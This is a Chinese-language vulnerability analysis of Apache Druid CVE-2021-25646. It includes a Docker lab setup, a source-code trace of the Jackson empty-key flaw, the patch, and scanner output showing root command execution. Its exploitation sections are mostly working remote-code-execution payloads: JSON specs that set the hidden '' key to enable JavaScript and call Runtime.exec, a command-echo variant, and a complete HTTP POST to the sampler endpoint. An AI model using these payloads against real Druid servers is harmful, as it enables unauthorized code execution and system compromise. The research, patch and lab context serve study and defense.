# Apache Druid远程代码执行漏洞(CVE-2021-25646)


### 靶场搭建

```yaml
version: "2.2"

volumes:
  metadata_data: {}
  middle_var: {}
  historical_var: {}
  broker_var: {}
  coordinator_var: {}
  router_var: {}

services:
  postgres:
    container_name: postgres
    image: postgres:latest
    volumes:
      - metadata_data:/var/lib/postgresql/data
    environment:
      - POSTGRES_PASSWORD=FoolishPassword
      - POSTGRES_USER=druid
      - POSTGRES_DB=druid
  # Need 3.5 or later for container nodes
  zookeeper:
    container_name: zookeeper
    image: zookeeper:3.5
    environment:
      - ZOO_MY_ID=1
    
  coordinator:
    image: apache/druid:0.20.0
    container_name: coordinator
    volumes:
      - ./storage:/opt/data
      - coordinator_var:/opt/druid/var
    depends_on: 
      - zookeeper
      - postgres
    ports:
      - "8081:8081"
    command:
      - coordinator
    env_file:
      - environment
  broker:
    image: apache/druid:0.20.0
    container_name: broker
    volumes:
      - broker_var:/opt/druid/var
    depends_on: 
      - zookeeper
      - postgres
      - coordinator
    ports:
      - "8082:8082"
    command:
      - broker
    env_file:
      - environment
  historical:
    image: apache/druid:0.20.0
    container_name: historical
    volumes:
      - ./storage:/opt/data
      - historical_var:/opt/druid/var
    depends_on: 
      - zookeeper
      - postgres
      - coordinator
    ports:
      - "8083:8083"
    command:
      - historical
    env_file:
      - environment
  middlemanager:
    image: apache/druid:0.20.0
    container_name: middlemanager
    volumes:
      - ./storage:/opt/data
      - middle_var:/opt/druid/var
    depends_on: 
      - zookeeper
      - postgres
      - coordinator
    ports:
      - "8091:8091"
    command:
      - middleManager
    env_file:
      - environment
  router:
    image: apache/druid:0.20.0
    container_name: router
    volumes:
      - router_var:/opt/druid/var
    depends_on:
      - zookeeper
      - postgres
      - coordinator
    ports:
      - "8888:8888"
    command:
      - router
    env_file:
      - environment
```

environment
```
# Java tuning
DRUID_XMX=1g
DRUID_XMS=1g
DRUID_MAXNEWSIZE=250m
DRUID_NEWSIZE=250m
DRUID_MAXDIRECTMEMORYSIZE=6172m

druid_emitter_logging_logLevel=debug

druid_extensions_loadList=["druid-histogram", "druid-datasketches", "druid-lookups-cached-global", "postgresql-metadata-storage"]

druid_zk_service_host=zookeeper

druid_metadata_storage_host=
druid.javascript.enabled = true
druid_metadata_storage_type=postgresql
druid_metadata_storage_connector_connectURI=jdbc:postgresql://postgres:5432/druid
druid_metadata_storage_connector_user=druid
druid_metadata_storage_connector_password=FoolishPassword

druid_coordinator_balancer_strategy=cachingCost

druid_indexer_runner_javaOptsArray=["-server", "-Xmx1g", "-Xms1g", "-XX:MaxDirectMemorySize=4g", "-Duser.timezone=UTC", "-Dfile.encoding=UTF-8", "-Djava.util.logging.manager=org.apache.logging.log4j.jul.LogManager"]
druid_indexer_fork_property_druid_processing_buffer_sizeBytes=268435456

druid_storage_type=local
druid_storage_storageDirectory=/opt/data/segments
druid_indexer_logs_type=file
druid_indexer_logs_directory=/opt/data/indexing-logs

druid_processing_numThreads=2
druid_processing_numMergeBuffers=2

DRUID_LOG4J=<?xml version="1.0" encoding="UTF-8" ?><Configuration status="WARN"><Appenders><Console name="Console" target="SYSTEM_OUT"><PatternLayout pattern="%d{ISO8601} %p [%t] %c - %m%n"/></Console></Appenders><Loggers><Root level="info"><AppenderRef ref="Console"/></Root><Logger name="org.apache.druid.jetty.RequestLog" additivity="false" level="DEBUG"><AppenderRef ref="Console"/></Logger></Loggers></Configuration>
```

### 漏洞分析

本文讲述下，在没有漏洞详情的情况下怎么去寻找漏洞点。

> Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.

通过cve的信息，可以推测出Druid在0.20版本以及之前版本存在可以通过javascript来执行代码

由于javascript来执行命令，那就要找到js解析的引擎。

通过查询文档发现Apache Druid内置了Rhino。

Rhino是一个可以将嵌入在JavaScript中的Java代码解析并执行的解析器。该功能是为了能够动态的扩展Druid的功能，默认禁用的。

```java
//core/src/main/java/org/apache/druid/js/JavaScriptConfig.java
@PublicApi
public class JavaScriptConfig
{
  public static final int DEFAULT_OPTIMIZATION_LEVEL = 9;

  private static final JavaScriptConfig ENABLED_INSTANCE = new JavaScriptConfig(true);

  @JsonProperty
  private final boolean enabled;

  @JsonCreator
  public JavaScriptConfig(
      @JsonProperty("enabled") boolean enabled
  )
  {
    this.enabled = enabled;
  }
```
可以看到通过enabled来控制是否开启，那我们只要找到哪些地方可以控制，就可以利用。

![avatar](../../../images/java/ApacheDruid/CVE-2021-25646/2.png)

这里挑选一个利用流程讲，拿`javaScriptDimFilter.java`为例

```java
indexing-service/src/main/java/org/apache/druid/indexing/overlord/sampler/IndexTaskSamplerSpec.java
public class IndexTaskSamplerSpec implements SamplerSpec
{
  @Nullable
  private final DataSchema dataSchema;
  private final InputSource inputSource;
  /**
   * InputFormat can be null if {@link InputSource#needsFormat()} = false.
   */
  @Nullable
  private final InputFormat inputFormat;
  @Nullable
  private final SamplerConfig samplerConfig;
  private final InputSourceSampler inputSourceSampler;

  @JsonCreator
  public IndexTaskSamplerSpec(
      @JsonProperty("spec") final IndexTask.IndexIngestionSpec ingestionSpec,
      @JsonProperty("samplerConfig") @Nullable final SamplerConfig samplerConfig,
      @JacksonInject InputSourceSampler inputSourceSampler
  )
-> 
server/src/main/java/org/apache/druid/segment/indexing/DataSchema.java
DataSchema 
  @JsonCreator
  public DataSchema(
      @JsonProperty("dataSource") String dataSource,
      @JsonProperty("timestampSpec") @Nullable TimestampSpec timestampSpec, // can be null in old task spec
      @JsonProperty("dimensionsSpec") @Nullable DimensionsSpec dimensionsSpec, // can be null in old task spec
      @JsonProperty("metricsSpec") AggregatorFactory[] aggregators,
      @JsonProperty("granularitySpec") GranularitySpec granularitySpec,
      @JsonProperty("transformSpec") TransformSpec transformSpec,
      @Deprecated @JsonProperty("parser") @Nullable Map<String, Object> parserMap,
      @JacksonInject ObjectMapper objectMapper
  )
-> 
processing/src/main/java/org/apache/druid/segment/transform/TransformSpec.java
class TransformSpec
  @JsonCreator
  public TransformSpec(
      @JsonProperty("filter") final DimFilter filter,
      @JsonProperty("transforms") final List<Transform> transforms
  )
-> 
processing/src/main/java/org/apache/druid/query/filter/DimFilter.java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes(value = {
    @JsonSubTypes.Type(name = "and", value = AndDimFilter.class),
    @JsonSubTypes.Type(name = "or", value = OrDimFilter.class),
    @JsonSubTypes.Type(name = "not", value = NotDimFilter.class),
    @JsonSubTypes.Type(name = "selector", value = SelectorDimFilter.class),
    @JsonSubTypes.Type(name = "columnComparison", value = ColumnComparisonDimFilter.class),
    @JsonSubTypes.Type(name = "extraction", value = ExtractionDimFilter.class),
    @JsonSubTypes.Type(name = "regex", value = RegexDimFilter.class),
    @JsonSubTypes.Type(name = "search", value = SearchQueryDimFilter.class),
    @JsonSubTypes.Type(name = "javascript", value = JavaScriptDimFilter.class),
    @JsonSubTypes.Type(name = "spatial", value = SpatialDimFilter.class),
    @JsonSubTypes.Type(name = "in", value = InDimFilter.class),
    @JsonSubTypes.Type(name = "bound", value = BoundDimFilter.class),
    @JsonSubTypes.Type(name = "interval", value = IntervalDimFilter.class),
    @JsonSubTypes.Type(name = "like", value = LikeDimFilter.class),
    @JsonSubTypes.Type(name = "expression", value = ExpressionDimFilter.class),
    @JsonSubTypes.Type(name = "true", value = TrueDimFilter.class),
    @JsonSubTypes.Type(name = "false", value = FalseDimFilter.class)
})
-> 
processing/src/main/java/org/apache/druid/query/filter/JavaScriptDimFilter.java
  @JsonCreator
  public JavaScriptDimFilter(
      @JsonProperty("dimension") String dimension,
      @JsonProperty("function") String function,
      @JsonProperty("extractionFn") @Nullable ExtractionFn extractionFn,
      @JsonProperty("filterTuning") @Nullable FilterTuning filterTuning,
      @JacksonInject JavaScriptConfig config
  )
->
core/src/main/java/org/apache/druid/js/JavaScriptConfig.java
  @JsonCreator
  public JavaScriptConfig(
      @JsonProperty("enabled") boolean enabled
  )
  {
    this.enabled = enabled;
  }

```

现在就剩下怎么去修改config配置来达到开启javascript的功能，通过查看官方补丁https://github.com/apache/druid/pull/10818

core/src/main/java/org/apache/druid/guice/GuiceAnnotationIntrospector.java
```
    // We should not allow empty names in any case. However, there is a known bug in Jackson deserializer
    // with ignorals (_arrayDelegateDeserializer is not copied when creating a contextual deserializer.
    // See https://github.com/FasterXML/jackson-databind/issues/3022 for more details), which makes array
    // deserialization failed even when the array is a valid field. To work around this bug, we return
    // an empty ignoral when the given Annotated is a parameter with JsonProperty that needs to be deserialized.
    // This is valid because every property with JsonProperty annoation should have a non-empty name.
    // We can simply remove the below check after the Jackson bug is fixed.
    //
    // This check should be fine for so-called delegate creators that have only one argument without
    // JsonProperty annotation, because this method is not even called for the argument of
    // delegate creators. I'm not 100% sure why it's not called, but guess it's because the argument
    // is some Java type that Jackson already knows how to deserialize. Since there is only one argument,
    // Jackson perhaps is able to just deserialize it without introspection.
```

可以从补丁文件GuiceAnnotationIntrospector.java的注释中了解到，即使某个键值对的key是空的，jackson仍然会在特定情况下将其解析，并将key为空的值传给没有被@JsonProperty修饰的属性。注释中也给出了jackson issues的链接，里面阐述了这个问题。

@JsonCreator用于在json反序列化时指明调用特定构造方法。

@JsonProperty用于属性上，作用是把该属性的名称序列化为另外一个名称，比如@JsonProperty("before") String after，会将json里key为before的内容解析到after变量上。


当注解@JsonCreator修饰方法时(@JsonCreator用于在json反序列化时指明调用特定构造方法)
，方法的所有参数都会被解析成CreatorProperty类型，如果属性没有被@JsonProperty修饰，就会创建一个name为""的CreatorProperty，Jackson会将用户输入的key为""的value赋值给该属性。

基于这个问题，我们可以在符合上述条件的情况下，通过传入json格式的数据，覆盖特定值。




在上面的代码中，config是没有被@JsonProperty修饰的，因此当用户传入key为空的键值对时，形如{"":"ParseToConfig"}，ParseToConfig会被解析到config变量上。 (ParseToConfig不是JavaScriptConfig类型，此处仅作为简单演示)

因此此处可以在开发者预期外控制config变量，继续看看JavaScriptConfig类中做了哪些事。

我们需要构造`"": { "enabled": true }`去开启javascript enabled

完整的数据包可以根据代码来生成或直接README中搜索，存在很多示例。




#### JavaScript解析入口

```java
//org.apache.druid.query.filter.JavaScriptDimFilter

public boolean applyInContext(Context cx, Object input)
{
  if (extractionFn != null) {
    input = extractionFn.apply(input);
  }
  return Context.toBoolean(fnApply.call(cx, scope, scope, new Object[]{input}));
}
```

#### 新旧版本差异

在测试旧版本0.15.0的时候发现poc不通用，提示`[spec.ioConfig.firehose] is required`,查看对应代码
```java
//indexing-service/src/main/java/org/apache/druid/indexing/overlord/sampler/IndexTaskSamplerSpec.java
 @JsonCreator
  public IndexTaskSamplerSpec(
      @JsonProperty("spec") final IndexTask.IndexIngestionSpec ingestionSpec,
      @JsonProperty("samplerConfig") final SamplerConfig samplerConfig,
      @JacksonInject FirehoseSampler firehoseSampler
      @JsonProperty("samplerConfig") @Nullable final SamplerConfig samplerConfig,
      @JacksonInject InputSourceSampler inputSourceSampler
  )
  {
    this.dataSchema = Preconditions.checkNotNull(ingestionSpec, "[spec] is required").getDataSchema();

    Preconditions.checkNotNull(ingestionSpec.getIOConfig(), "[spec.ioConfig] is required");

    this.firehoseFactory = Preconditions.checkNotNull(
        ingestionSpec.getIOConfig().getFirehoseFactory(),
        "[spec.ioConfig.firehose] is required"
    );
    if (ingestionSpec.getIOConfig().getInputSource() != null) {
      this.inputSource = ingestionSpec.getIOConfig().getInputSource();
      if (ingestionSpec.getIOConfig().getInputSource().needsFormat()) {
        this.inputFormat = Preconditions.checkNotNull(
            ingestionSpec.getIOConfig().getInputFormat(),
            "[spec.ioConfig.inputFormat] is required"
        );
      } else {
        this.inputFormat = null;
      }
    } else {
      final FirehoseFactory firehoseFactory = Preconditions.checkNotNull(
          ingestionSpec.getIOConfig().getFirehoseFactory(),
          "[spec.ioConfig.firehose] is required"
      );
      if (!(firehoseFactory instanceof FiniteFirehoseFactory)) {
        throw new IAE("firehose should be an instance of FiniteFirehoseFactory");
      }
      this.inputSource = new FirehoseFactoryToInputSourceAdaptor(
          (FiniteFirehoseFactory) firehoseFactory,
          ingestionSpec.getDataSchema().getParser()
      );
      this.inputFormat = null;
    }

    this.samplerConfig = samplerConfig;
    this.firehoseSampler = firehoseSampler;
    this.inputSourceSampler = inputSourceSampler;
  }
```
文件历史上做了3次修改，旧版firehose是必传,这里注意一点，firehose在0.15.0版本`type`还没有`inline`,用其他类型替代。

0.20.0 POC
```json
{
	"type": "index",
	"spec": {
		"ioConfig": {
			"type": "index",
			"inputSource": {
				"type": "inline",
				"data": "{\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"xxx\":\"x\"}"
			},
			"inputFormat": {
				"type": "json",
				"keepNullColumns": true
			}
		},
		"dataSchema": {
			"dataSource": "sample",
			"timestampSpec": {
				"column": "timestamp",
				"format": "iso"
			},
			"dimensionsSpec": {},
			"transformSpec": {
				"transforms": [],
				"filter": {
					"type": "javascript",
					"dimension": "added",
					"function": "function(value) {java.lang.Runtime.getRuntime().exec('command')}",
					"": {
						"enabled": true
					}
				}
			}
		},
		"type": "index",
		"tuningConfig": {
			"type": "index"
		}
	},
	"samplerConfig": {
		"numRows": 500,
		"timeoutMs": 15000
	}
}
```

修改POC,`inputSource`改成`firehose`,`inputFormat`新版才有，为了兼容老版本去除。使用`parser`去解析文件
```java
{
      	"type": "index",
      	"spec": {
      		"ioConfig": {
      			"type": "index",
      			"firehose": {
      				"type": "local",
      				"baseDir": "/xxx",
      				"filter": "xxx"
      			}
      		},
      		"dataSchema": {
      			"dataSource": "%%DATASOURCE%%",
      			"parser": {
      				"parseSpec": {
      					"format": "json",
      					"timestampSpec": {},
      					"dimensionsSpec": {},
      				}
      			}
      		}
      	},
      	"samplerConfig": {
      		"numRows": 10
      	}
      }
```

### 曲折的命令回显
作为扫描器的POC要兼容新老版本，还要做到精准检测，单单的命令执行没有回显肯定不行（要考虑不出网的情况）

回显思路
1. 获取全局的request，response,来修改当前CurrentThread的resposne内容
2. 报错回显
3. 写入文件，读取文件
4. linux socket的文件描述符（Druid不能在windows安装）
5. .....

#### 读写文件回显法

通过命令执行，把结果使用jackson的包把json格式的结果写入到/tmp下
```java
function(value){var a=new java.io.BufferedWriter(new java.io.FileWriter(\"/tmp/123.json\"));var cmd =java.lang.Runtime.getRuntime().exec(\"{{command}}\");var test = new com.fasterxml.jackson.databind.ObjectMapper();var jsonObj = test.createObjectNode();jsonObj.put(\"time\",\"2015-09-12T00:46:58.771Z\");jsonObj.put(\"test\",new java.util.Scanner(cmd.getInputStream()).useDelimiter(\"\\A\").next());a.write(jsonObj.toString());a.close();
```
通过写文件，然后在利用druid的任意文件读取来获取命令结果

但是这里有个坑，因为想要编写通用新旧版本POC，导致不能使用`inline`,我这里采用了`local`方式,但是读取的文件如果是格式错误的，导致异常退出，流程没有走到命令执行的地方。
这里就有了前置条件

**找到合法的解析文件让他不报错（新版可以直接只用`inline`不报错，无影响)**

这种方式肯定不是我们想要的，继续看代码分析，后来找到了`parse`下也可以执行`function`函数, 然后刚好是在解析时候执行的命令，在异常前执行完毕命令。

```json
{
"dataSchema": {
    "dataSource": "%%DATASOURCE%%",
    "parser": {
        "parseSpec": {
            "format": "javascript",
            "timestampSpec": {},
            "dimensionsSpec": {},
            "function": "function(){ xxxx }}",
            "": {
                "enabled": "true"
            }
        }
    }
}
}
```

#### 直接命令回显
在看parseSpec文档的时候，发现`function`可以直接修改回显内容，`return`的内容为`{key:value}`
改进POC，直接页面输出命令结果
```json
{
      	"type": "index",
      	"spec": {
      		"ioConfig": {
      			"type": "index",
      			"firehose": {
      				"type": "local",
      				"baseDir": "/etc",
      				"filter": "passwd"
      			}
      		},
      		"dataSchema": {
      			"dataSource": "%%DATASOURCE%%",
      			"parser": {
      				"parseSpec": {
      					"format": "javascript",
      					"timestampSpec": {},
      					"dimensionsSpec": {},
      					"function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"{{command}}\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"2013-09-01T12:41:27Z\",test: s}}",
      					"": {
      						"enabled": "true"
      					}
      				}
      			}
      		}
      	},
      	"samplerConfig": {
      		"numRows": 10
      	}
      }
```


### 漏洞修复

1. 升级到Apache Druid 0.20.1。

2. 加强访问控制，禁止未授权用户访问web管理页面。

3. 官方代码修复：

```java
//org.apache.druid.guice.GuiceAnnotationIntrospector

 @Override
  public JsonIgnoreProperties.Value findPropertyIgnorals(Annotated ac)
  {
    if (ac instanceof AnnotatedParameter) {
      final AnnotatedParameter ap = (AnnotatedParameter) ac;
      if (ap.hasAnnotation(JsonProperty.class)) {
        return JsonIgnoreProperties.Value.empty();
      }
    }

    return JsonIgnoreProperties.Value.forIgnoredProperties("");
  }
```

重写了Jackson的findPropertyIgnorals方法

```java
//com.fasterxml.jackson.databind.AnnotationIntrospector

public JsonIgnoreProperties.Value findPropertyIgnorals(Annotated ac)
{
    // 18-Oct-2016, tatu: Used to call deprecated methods for backwards
    //   compatibility in 2.8, but not any more in 2.9
    return JsonIgnoreProperties.Value.empty();
}
```

在这个方法里，返回了JsonIgnoreProperties.Value.empty()。这意味着Jackson允许一个name为空的属性。

而修复后的代码判断逻辑为：当属性被@JsonProperty修饰，则允许为空，如果属性没有被@JsonProperty修饰，则不允许为空。

### 漏洞利用

```javascript
POST /druid/indexer/v1/sampler HTTP/1.1
Host: localhost:8888
Accept: application/json, text/plain
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 902
Connection: keep-alive

{
          "type": "index",
          "spec": {
              "ioConfig": {
                  "type": "index",
                  "firehose": {
                      "type": "local",
                      "baseDir": "/etc",
                      "filter": "passwd"
                  }
              },
              "dataSchema": {
                  "dataSource": "%%DATASOURCE%%",
                  "parser": {
                      "parseSpec": {
                          "format": "javascript",
                          "timestampSpec": {},
                          "dimensionsSpec": {},
                          "function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"{{command}}\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"2013-09-01T12:41:27Z\",test: s}}",
                          "": {
                              "enabled": "true"
                          }
                      }
                  }
              }
          },
          "samplerConfig": {
              "numRows": 10
          }
      }
```

### PSF案例

```shell
╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●4✚7…1⚑70)
╰─λ ./phenixsuite scan --poc static/pocs/apache-druid-cve-2021-25646-rce-attack.yml --url http://127.0.0.1:8888 --mode attack --options shell                                                                                                   127 < 00:00:00 < 11:20:26
input command (require): id
2021/02/04 11:20:47 scan.go:496: [INFO ] attack poc-yaml-apache-druid-cve-2021-25646-rce-attack
2021/02/04 11:20:47 scan.go:142: [INFO ] scan poc num:1 total:1
2021/02/04 11:20:48 scan.go:633: [INFO ] poc:poc-yaml-apache-druid-cve-2021-25646-rce-attack execute success
2021/02/04 11:20:48 scan.go:313: [INFO ] vul exist poc:poc-yaml-apache-druid-cve-2021-25646-rce-attack url:http://127.0.0.1:8888
 #   target-url              poc-name                                          gev-id       level      category    status   author   require   detail-extend                             
--- ----------------------- ------------------------------------------------- ------------ ---------- ----------- -------- -------- --------- -------------------------------------------
 1   http://127.0.0.1:8888   poc-yaml-apache-druid-cve-2021-25646-rce-attack   GEV-143659   critical   code-exec   exist    huakai             uid=0(root) gid=0(root) groups=0(root)\\n 
```

